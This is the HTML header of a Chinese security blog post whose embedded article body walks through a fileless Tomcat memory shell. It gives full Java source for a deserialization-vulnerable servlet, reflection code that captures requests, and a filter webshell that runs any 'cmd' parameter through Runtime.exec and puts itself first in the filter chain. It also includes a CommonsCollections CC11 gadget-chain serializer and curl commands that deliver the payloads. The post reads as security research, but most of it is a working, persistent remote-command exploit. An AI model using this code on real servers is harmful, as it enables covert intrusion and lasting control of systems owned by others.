<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Tomcat无文件内存马 | Reus09&#39;s Blog</title>
<meta name="keywords" content="内存马">
<meta name="description" content="前言 之前学习了Tomcat的相关内存马，通过jsp文件简单学习实现了一下，但是还是有些瑕疵的，内存马生成过程中还是有webshell文件落地">
<meta name="author" content="Reus09">
<link rel="canonical" href="/en/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Tomcat无文件内存马" />
<meta property="og:description" content="前言 之前学习了Tomcat的相关内存马，通过jsp文件简单学习实现了一下，但是还是有些瑕疵的，内存马生成过程中还是有webshell文件落地" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/en/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-16T21:25:18+08:00" />
<meta property="article:modified_time" content="2023-04-16T21:25:18+08:00" /><meta property="og:site_name" content="(〃&#39;▽&#39;〃)" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Tomcat无文件内存马"/>
<meta name="twitter:description" content="前言 之前学习了Tomcat的相关内存马，通过jsp文件简单学习实现了一下，但是还是有些瑕疵的，内存马生成过程中还是有webshell文件落地"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  5 ,
      "name": "Tomcat无文件内存马",
      "item": "/en/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Tomcat无文件内存马",
  "name": "Tomcat无文件内存马",
  "description": "前言 之前学习了Tomcat的相关内存马，通过jsp文件简单学习实现了一下，但是还是有些瑕疵的，内存马生成过程中还是有webshell文件落地",
  "keywords": [
    "内存马"
  ],
  "articleBody": "前言 之前学习了Tomcat的相关内存马，通过jsp文件简单学习实现了一下，但是还是有些瑕疵的，内存马生成过程中还是有webshell文件落地的。\n现在通过天下大木头,threedr3am师傅的博客学习一下通过反序列化实现内存马的生成。\n回显问题 jsp中内置了request和response，我们是可以直接获取到，通过request获取参数，response写我们的回显内容。\n我们要结合反序列化打，注入的是字节码，因此我们需要通过一些手段获取到request和response，这样我们就可以回显。\n这里看一下tomcat处理http请求的堆栈情况，发现request和response一路传递，并且在内存中都是同一个变量，但是每个函数都是通过传参的的方式进行传递request和response。\nkingkk 师傅的思路是寻找一个静态的可以存储 request 和 response 的变量，因为如果不是静态的话，那么我们还需要获取到对应的实例。\n最终kingkk 师傅在org.apache.catalina.core.ApplicationFilterChain这个类中，找到了符合要求的变量，这里lastServicedRequest和lastServicedResponse都是静态变量，是全局的。\n看一下lastServicedRequest和lastServicedResponse在哪些地方存在调用。\n首先在org.apache.catalina.core.ApplicationFilterChain类中，在静态代码块会进行lastServicedRequest和lastServicedResponse的初始化，因为ApplicationDispatcher.WRAP_SAME_OBJECT 默认为 False ,根据静态代码块的最优先执行顺序，lastServicedRequest和lastServicedResponse会初始化为null.\n然后在ApplicationFilterChain#internalDoFilter方法中，在执行Servlet的service方法前，先对ApplicationDispatcher.WRAP_SAME_OBJECT 的值进行判断，如果值为true，就将当前request和response分别存放到lastServicedRequest和lastServicedResponse里面。 最后在try-catch-finally语句中，在 finally 中又将 lastServicedRequest 和 lastServicedResponse 设为了 null。\n因此思路就很明确，通过反射，修改ApplicationDispatcher.WRAP_SAME_OBJECT的值为false,然后反射对lastServicedRequest和lastServicedResponse两个静态变量进行初始化，这样当程序执行到ApplicationFilterChain#internalDoFilter()方法的时候，就获取了request和response。\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 public static void updateFinalField(Class aclass,String filedName){ try{ java.lang.reflect.Field field = aclass.getDeclaredField(filedName); // 修改final 变量的值反射流程 java.lang.reflect.Field modifiersField = field.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(field,field.getModifiers() \u0026 ~java.lang.reflect.Modifier.FINAL); field.setAccessible(true); // 对于WRAP_SAME_OBJECT,需要设置值为true. if(filedName == \"WRAP_SAME_OBJECT\"){ if(!field.getBoolean(null)){ field.setBoolean(null,true); } }else{ // 对于lastServicedRequest 和 lastServicedResponse 我们需要将其初始化ThreadLocal() if(field.get(null) == null){ field.set(null,new ThreadLocal()); } } }catch (Exception e){ e.printStackTrace(); } } static { try{ // 修改WRAP_SAME_OBJECT 值为 true String WRAP_SAME_OBJECT_NAME = \"WRAP_SAME_OBJECT\"; String lastServicedRequestName = \"lastServicedRequest\"; String lastServicedResponseName = \"lastServicedResponse\"; Class\u003c?\u003e applicationDispatcherClass = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); Class\u003c?\u003e applicationFilterChainClass = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); updateFinalField(applicationDispatcherClass,WRAP_SAME_OBJECT_NAME); updateFinalField(applicationFilterChainClass,lastServicedRequestName); updateFinalField(applicationFilterChainClass,lastServicedResponseName); }catch (Exception e){ e.printStackTrace(); } } 内存马实现 实现内存马的大致思路：\n1、我们通过反射实现lastServicedRequest、 lastServicedResponse 初始化并存储request和response。\n2、根据获得到的lastServicedRequest和lastServicedResponse获取request和response，然后利用request获取servletContext，然后动态注册Filter、Servlet、Listerner等组件。\n我们这里是结合CC11链实现反序列化注册Filter内存马，其他种类内存马的实现大同小异。\n漏洞环境 创建一个Servlet，存在一个反序列化注入点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package servlet; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.InputStream; import java.io.ObjectInputStream; /** * @ClassName EvilServlet * @Description TODO * @Author reus09 * @Date 2023/4/16 21:39 * @Version 1.0 **/ @WebServlet(\"/evil\") public class EvilServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { InputStream inputStream = req.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try{ objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } resp.getWriter().write(\"Hello,Reus09!\"); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { InputStream inputStream = req.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try{ objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } resp.getWriter().write(\"Hello,Reus09!\"); } } 在pom.xml里面添加commons-collections依赖\n1 2 3 4 5 commons-collections commons-collections 3.1 反序列化注入 步骤一 我们需要创建一个继承了AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）的TomcatEchoInject类，在其代码里面通过反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化，代码与我们在 回显问题 章节的代码基本一致\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package Evil; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.lang.reflect.Field; import java.util.logging.Filter; import java.util.logging.LogRecord; /** * @ClassName TomcatEchoInject * @Description TODO * @Author reus09 * @Date 2023/4/16 21:48 * @Version 1.0 **/ public class TomcatEchoInject extends AbstractTranslet{ public static void updateFinalField(Class aclass,String filedName){ try{ java.lang.reflect.Field field = aclass.getDeclaredField(filedName); java.lang.reflect.Field modifiersField = field.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(field,field.getModifiers() \u0026 ~java.lang.reflect.Modifier.FINAL); field.setAccessible(true); if(filedName == \"WRAP_SAME_OBJECT\"){ if(!field.getBoolean(null)){ field.setBoolean(null,true); } }else{ if(field.get(null) == null){ field.set(null,new ThreadLocal()); } } }catch (Exception e){ e.printStackTrace(); } } static { try{ // 修改WRAP_SAME_OBJECT 值为 true // 修改final 的值 String WRAP_SAME_OBJECT_NAME = \"WRAP_SAME_OBJECT\"; String lastServicedRequestName = \"lastServicedRequest\"; String lastServicedResponseName = \"lastServicedResponse\"; Class\u003c?\u003e applicationDispatcherClass = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); Class\u003c?\u003e applicationFilterChainClass = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); updateFinalField(applicationDispatcherClass,WRAP_SAME_OBJECT_NAME); updateFinalField(applicationFilterChainClass,lastServicedRequestName); updateFinalField(applicationFilterChainClass,lastServicedResponseName); }catch (Exception e){ e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 步骤二 将 request 和 response 进行取出，然后注入我们的filter。\n获得ServletContext 通过反射获得lastServicedRequest变量，因为其存储的类型是ServletRequest，可以通过get方法获得request，之后通过getServletContext方法获得servletContext\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public static ServletContext getServletContext() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ServletRequest servletRequest = null; /*shell注入，前提需要能拿到request、response等*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 if (threadLocal != null \u0026\u0026 threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } assert servletRequest != null; ServletContext servletContext = servletRequest.getServletContext(); if(servletContext != null){ return servletContext; }else{ return null; } } 注册Filter 其实这里直接根据我们之前在Tomcat内存马文章里面提到的注册Filter内存马的方法一样，直接初始化添加FilterDef、然后通过StandarContext获取FilterConfigs、手动构造FilterConfig,FilterMap,最后一一添加即可。\n这里根据大师傅的博客，学习一下另一条注册Filter的路线，其实原理都是大同小异。\nServletContext 提供了addFilter方法，三个重载方法，分别接收字符串类型的 filterName 以及 Filter 对象/className 字符串/Filter 子类的 Class 对象，提供不同场景下添加 filter 的功能，这些方法均返回 FilterRegistration.Dynamic 实际上就是 FilterRegistration 对象，三种重载方法实际上都是调用org.apache.catalina.core.ApplicationContext#addFilter(java.lang.String, java.lang.String, javax.servlet.Filter)方法\n这个方法创建了一个 FilterDef 对象，将 filterName、filterClass、filter 对象初始化进去，使用 StandardContext 的 addFilterDef 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中，然后 new 了一个 ApplicationFilterRegistration 对象并且返回。\n但是这个方法添加自定义Filter有两个问题：\n1、并且context.getState()在运行时返回的state已经是LifecycleState.STARTED表示程序在运行中，因此如果直接添加的话，程序会直接抛出错误：applicationContext.addFilter.ise.\n2、Filter内存马的传递是通过FilterChain，addFilter方法并没有将添加的Filter放到FilterChain链中，因此单纯调用这个方法并不会实现自定义的Filter注册。\n问题一 对于问题一，有两种解决方案\n方法一：\n我们直接不考虑使用org.apache.catalina.core.ApplicationContext#addFilter()这个方法，因为实际上该方法是通过standardContext.addFilterDef()来实现添加filterDef,因此我们通过反射构造filterDef，然后封装为一个ApplicationFilterRegistration对象即可。 实现方法和之前tomcat内存马学到的差不多，就不再赘述。 方法二：\n我们通过反射修改context字段的state，在添加filter前，通过反射设置成LifecycleState.STARTING_PREP，在其顺利添加完成后，再把其恢复成LifecycleState.STARTE，这里必须要恢复，要不然会造成服务不可用。\n1 2 3 4 5 6 7 8 9 10 11 12 //修改状态，要不然调用addFilter方法没有效果 java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); xxxxxxx // 恢复状态，使服务正常使用 if(stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } 问题二 在实际执行栈中，可以看到，实际filter的创建是在org.apache.catalina.core.StandardWrapperValve#invoke执行ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);的地方。\n在createFilterchain方法中先通过wrapper.getParent()获得当前的StandardContext，然后从context中获取FilterMaps\n接着createChain方法会遍历 FilterMaps 中的 FilterMap，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern 相匹配，就会进入 if 判断，调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的 FilterConfig，然后如果不为null，就进入 if 判断，将 filterConfig 添加到 filterChain中。\n上述如果获取到的filterConfig不为null的话，就调用org.apache.catalina.core.ApplicationFilterChain#addFilter方法将当前Filter添加到FilterChain上面。\n首先会遍历filters，判断我们的filter是否已经存在（其实就是去重），接下来的 if 判断就是扩容，如果 n 已经等于当前 filters 的长度了就再添加10个容量，最后将我们的filterConfig 添加到 filters中。\n至此 filterChain 组装完毕。\n我们可以看到，createFilterChain方法从standardContext中提取了FilterMaps数组，然后遍历FilterMaps，对每个FilterMap对应的FilterName从standardContext中获取对应的FilterConfig，最后将该filterConfig添加到filterChain中。\n因此我们需要在FilterMaps和FilterConfigs中注册封装我们自定义的Filter相关信息的FilterMap和FilterConfig。\n注册FilterMap:\n我们之前通过org.apache.catalina.core.ApplicationContext#addFilter()方法得到的FilterRegistration对象可以调用org.apache.catalina.core.ApplicationFilterRegistration#addMappingForUrlPatterns方法，实现将filterMap插入到standardContext的filterMaps中。\n因此注册FilterDef和FilterMap的完整操作为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //修改状态，要不然调用addFilter方法没有效果 java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); //创建一个自定义的Filter马 Filter filter = new TomcatShellInject(); // 调用addFilter 方法添加 javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(FILTER_NAME,filter); // 进行一些简单的设置 filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); // 设置基本的url pattern, 并且注册filterMap filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),false,new String[]{FILTER_URL_PATTERN}); // 恢复状态，使服务正常使用 if(stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } 注册FilterConfig:\n第一种方法：\n我们可以通过反射获得StandardContext对象的filterConfigs属性，然后实例化封装一个FilterConfig对象，然后直接将其添加到filterConfigs中。\n1 2 3 4 5 6 7 8 9 10 11 12 //获得filterconfigs Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); // 实例化一个ApplicationFilterConfig对象 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef); // filterConfig的Map是一个HashMap类型的，直接压入就可以 filterConfigs.put(name,filterConfig); 第二种方法：\n在StandardContext中的方法filterStart实现了根据filterDefs生成filterConfigs。\n因此我们通过反射直接执行filterStart方法就可以实现注册FilterConfig\n1 2 3 4 // 设置filter之后调用 filterstart 来启动我们的 filter java.lang.reflect.Method filterStartMethod = StandardContext.class.getDeclaredMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); 自定义filter优先 回看org.apache.catalina.core.ApplicationFilterFactory#createFilterChain的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // Add the relevant path-mapped filters to this filter chain for (FilterMap filterMap : filterMaps) { if (!matchDispatcher(filterMap, dispatcher)) { continue; } if (!matchFiltersURL(filterMap, requestPath)) { continue; } ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName()); if (filterConfig == null) { // FIXME - log configuration problem continue; } filterChain.addFilter(filterConfig); } 创建的顺序是根据filterMaps的顺序来的，那么我们就有必要去修改我们添加的filter顺序到第一位了，我们只需要修改我们注册的filterMap在filterMaps中是第一个就可以了。\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 /** * 将我们的 filtermap 插入到最前面 */ Class ccc = null; try { ccc = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\"); } catch (Throwable t){} if (ccc == null) { try { ccc = Class.forName(\"org.apache.catalina.deploy.FilterMap\"); } catch (Throwable t){} } //把filter插到第一位 java.lang.reflect.Method m = Class.forName(\"org.apache.catalina.core.StandardContext\") .getDeclaredMethod(\"findFilterMaps\"); Object[] filterMaps = (Object[]) m.invoke(standardContext); Object[] tmpFilterMaps = new Object[filterMaps.length]; int index = 1; for (int i = 0; i \u003c filterMaps.length; i++) { Object o = filterMaps[i]; m = ccc.getMethod(\"getFilterName\"); String name = (String) m.invoke(o); if (name.equalsIgnoreCase(FILTER_NAME)) { tmpFilterMaps[0] = o; } else { tmpFilterMaps[index++] = filterMaps[i]; } } for (int i = 0; i \u003c filterMaps.length; i++) { filterMaps[i] = tmpFilterMaps[i]; } 其实这步骤也是可以不要的,因为我们在addMappingForUrlPatterns(EnumSet dispatcherTypes, boolean isMatchAfter, String... urlPatterns)方法里面，我们只要传入的isMatchAfter为false，那么我们实际上就可以直接调用addFilterMapBefore方法，将filterMap放到filterMaps的最前面。\n1 2 // 设置基本的url pattern, 并且注册filterMap，设置isMatchAfter为false,执行addFilterMapBefore方法，使filterMap插入的时候在最前面。 filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),false,new String[]{FILTER_URL_PATTERN}); 最后步骤二的完整POC代码如下：\n继承了AbstractTranslet类(携带恶意字节码到服务端加载执行)，同时实现了Filter接口，作为自定义的Filter，在它的doFilter方法中，对传入的命令参数执行命令。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 package Evil; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.*; import java.io.IOException; /** * @ClassName TomcatShellInject * @Description TODO * @Author reus09 * @Date 2023/4/16 22:07 * @Version 1.0 **/ public class TomcatShellInject extends AbstractTranslet implements Filter { /** * webshell命令参数名 */ private final String cmdParamName = \"cmd\"; private final static String FILTER_URL_PATTERN = \"/*\"; private final static String FILTER_NAME = \"reus09\"; static { try { javax.servlet.ServletContext servletContext = getServletContext(); if(servletContext != null){ org.apache.catalina.core.StandardContext standardContext = null; // 判断该filter 是否已存在 if(servletContext.getFilterRegistration(FILTER_NAME) == null){ java.lang.reflect.Field ctx = servletContext.getClass().getDeclaredField(\"context\"); ctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) ctx.get(servletContext); java.lang.reflect.Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); standardContext = (StandardContext) stdctx.get(applicationContext); if(standardContext != null){ //修改状态，要不然调用addFilter方法没有效果 java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); //创建一个自定义的Filter马 Filter filter = new TomcatShellInject(); // 调用addFilter 方法添加 javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(FILTER_NAME,filter); // 进行一些简单的设置 filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); // 设置基本的url pattern filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),false,new String[]{FILTER_URL_PATTERN}); // 回复状态，使服务正常使用 if(stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } // 在设置之后我们需要 调用 filterstart if (standardContext != null){ // 设置filter之后调用 filterstart 来启动我们的 filter java.lang.reflect.Method filterStartMethod = StandardContext.class.getDeclaredMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); } } } } }catch (Exception e){ e.printStackTrace(); } } public static ServletContext getServletContext() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ServletRequest servletRequest = null; /*shell注入，前提需要能拿到request、response等*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 if (threadLocal != null \u0026\u0026 threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } assert servletRequest != null; ServletContext servletContext = servletRequest.getServletContext(); if(servletContext != null){ return servletContext; }else{ return null; } } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println( \"TomcatShellInject doFilter.....................................................................\"); String cmd; if ((cmd = request.getParameter(cmdParamName)) != null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } response.getOutputStream().write(stringBuilder.toString().getBytes()); response.getOutputStream().flush(); response.getOutputStream().close(); return; } chain.doFilter(request,response); } @Override public void destroy() { } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void init(FilterConfig filterConfig) throws ServletException { } } 实现 使用CC11链将TomatEchoInject和TomcatShellInject两个恶意类序列化。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 package Evil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; /** * @ClassName CC11 * @Description TODO * @Author reus09 * @Date 2023/3/17 15:58 * @Version 1.0 **/ public class CC11 { public static void setFieldValue(Object obj, String fileNmae, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fileNmae); field.setAccessible(true); field.set(obj,value); } public static void main(String[] args) throws Exception { // 构造恶意 TemplatesImpl 对象 TemplatesImpl obj = new TemplatesImpl(); // 获取恶意类的字节码 byte[] code = Files.readAllBytes(Paths.get(\"/Users/reus09/Desktop/MemoryShell/target/classes/Evil/TomcatEchoInject.class\")); byte[][] codes = {code}; // 反射修改属性 setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); // ================ // 利用 InvokerTransformer 调用 TemplatesImpl.newTransformer //InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\", null, null); // tostrng InvokerTransformer invokertransformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); //=============== Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, invokertransformer); TiedMapEntry tme = new TiedMapEntry(outerMap,\"reus09\"); Map expMap = new HashMap(); expMap.put(tme, \"reus09\"); innerMap.remove(obj); setFieldValue(invokertransformer, \"iMethodName\",\"newTransformer\" ); setFieldValue(tme,\"key\",obj); // ============== // 生成序列化字符串 // ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream(\"./TomcatEchoInject.ser\")); ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream(\"./TomcatShellInject.ser\")); oss.writeObject(expMap); oss.close(); } } 然后利用 curl 进行注入即可\n首先注入 TomcatEchoInject.ser\n1 curl http://localhost:8080/evil --data-binary \"@/Users/xxx/xxx/TomcatEchoInject.ser\" 然后注入TomcatShellInject.ser\n1 curl http://localhost:8080/evil --data-binary \"@/Users/xxx/xxx/TomcatShellInject.ser\" 可以看到服务端报错，说明恶意的AbstractTranslet已成功反序列化。\n并且在内存中也可以看到优先执行我们自定义的Filter:TomcatShellInject.\n然后命令执行：\n瑕疵 这种利用方式实现了无落地的内存马注入，但是也有小缺陷，对于Shiro组件的系统无法实现，因为在org.apache.catalina.core.ApplicationFilterChain#internalDoFilter方法中，在对lastServicedRequest和lastServicedResponse赋值前，会先执行filter.doFilter(request, response, this)，执行完所有的Filter。\n但是在Shiro中，其实就是自己实现的filter\n我们的Shiro反序列化漏洞触发点：org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity方法里面调用了org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals方法，在里面对传入的bytes进行AES解密后进行反序列化。\nShiro的RemberMe功能其实在org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal方法里面通过createSubject里面逐步实现。\n因此对于Shiro的反序列化，在对lastServicedRequest和lastServicedResponse赋值前，先执行Shiro的Filter，在Filter里面存在反序列化触发点，而这个时候我们的lastServicedRequest和lastServicedResponse还未赋值，因此无法通杀Shiro。\n",
  "wordCount" : "8109",
  "inLanguage": "en",
  "datePublished": "2023-04-16T21:25:18+08:00",
  "dateModified": "2023-04-16T21:25:18+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
